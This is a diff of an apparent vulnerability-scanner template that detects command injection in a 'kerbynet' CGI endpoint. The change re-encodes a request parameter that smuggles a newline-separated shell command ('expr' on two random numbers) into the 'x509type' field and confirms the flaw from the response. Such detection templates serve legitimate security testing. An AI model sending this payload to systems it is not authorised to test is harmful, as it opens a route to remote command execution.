@@ -4,7 +4,7 @@ set:
  r2: randomInt(800000000, 1000000000)
 rules:
     - method: GET
-      path: "/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0aexpr%20{{r1}}%20%2b%20{{r2}}%0a'"
+      path: /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0aexpr%20{{r1}}%20%2b%20{{r2}}%0a%27
       expression: >
         response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
 detail:
